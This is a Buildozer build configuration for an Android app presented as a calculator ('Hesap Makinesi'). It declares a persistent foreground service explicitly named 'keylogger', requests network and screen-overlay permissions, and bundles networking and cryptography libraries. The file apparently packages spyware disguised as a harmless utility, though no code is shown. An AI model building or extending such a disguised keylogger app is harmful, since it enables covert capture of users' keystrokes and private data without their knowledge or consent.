[app]
title = Hesap Makinesi
package.name = hesapmakinesi
package.domain = org.hesap

source.dir = .
version = 1.0
requirements = python3,kivy,requests,cryptography,android

orientation = portrait
fullscreen = 0

[buildozer]
log_level = 2
warn_on_root = 0

[android]
api = 33
minapi = 21
ndk = 25b
p4a_dir = 
allow_backup = true
android.manifest_extra_applications = 
android.manifest_extra_permissions = 
android.add_src = 
android.add_resources = 
android.entrypoint = org.kivy.android.PythonActivity
android.gradle_dependencies = 
android.add_gradle_repositories = 
android.gradle_plugins = 
android.use_androidx = true

# Permissions
android.permissions = INTERNET,FOREGROUND_SERVICE,WAKE_LOCK,SYSTEM_ALERT_WINDOW

# Features
android.features = android.hardware.touchscreen

# Arch
android.arch = arm64-v8a

# Release config
;release = 1
;android.accept_sdk_license = true

[android:service]
name = keylogger
foreground = true

[android:activity]
launch_mode = singleTop

[ios]

[macos]

[windows]

[codesign]

# Kivy configuration
[app:kivy]
log_level = info
window_icon = 
pause_on_minimize = 0
